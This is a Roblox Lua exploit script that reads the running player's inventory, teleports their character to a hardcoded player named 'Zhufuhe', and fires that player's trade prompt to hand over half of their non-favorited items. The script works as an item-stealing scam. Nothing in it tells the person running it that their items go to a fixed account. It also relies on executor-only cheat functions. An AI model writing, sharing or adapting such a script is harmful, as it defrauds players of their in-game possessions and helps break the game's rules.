local Players = game:GetService("Players")
local Player = Players.LocalPlayer
local RS = game:GetService("ReplicatedStorage")
local Character = Player.Character or Player.CharacterAdded:Wait()
local Hum = Character:WaitForChild("Humanoid")
local HRP = Character:WaitForChild("HumanoidRootPart")

local DataService = require(RS.Modules.DataService)

-- Functions
local function getItemById(id)
    for _, container in ipairs({Player.Backpack, Player.Character}) do
        if container then
            for _, tool in ipairs(container:GetChildren()) do
                if tool:IsA("Tool") then
                    for key, value in pairs(tool:GetAttributes()) do
                        if value == id then
                            return tool
                        end
                    end
                end
            end
        end
    end
    return nil
end

local function teleport(position)
    local adjustedPos = position + Vector3.new(0, 0.5, 0)
    HRP.CFrame = CFrame.new(adjustedPos)
end

-- Init
local data = DataService:GetData()
local targetName = "Zhufuhe"
local targetPlayer = Players:FindFirstChild(targetName)
local targetHRP = targetPlayer.Character.HumanoidRootPart

local fruits = {}
for uuid, item in pairs(data.InventoryData) do
    local type = item.ItemType
    local data = item.ItemData
    local tool = getItemById(uuid)

    if type == "Holdable" then
        if not data.IsFavorite then
            table.insert(fruits, {
                tool = tool,
                uuid = uuid,
                name = data.ItemName,
                favorite = data.IsFavorite
            })
        end
    end
end

-- Teleport to target
teleport(targetHRP.Position)
task.wait(1)

-- Trade half (50%) inventory
if #fruits > 0 then
    local half = math.floor(#fruits / 2)
    for i = 1, half do
        local fruit = fruits[i]
        Hum:EquipTool(fruit.tool)
        task.wait(0.5)
        fireproximityprompt(workspace[targetName].HumanoidRootPart.ProximityPrompt)

        repeat task.wait() until Hum:FindFirstChildOfClass("Tool") ~= fruit.tool
    end
end
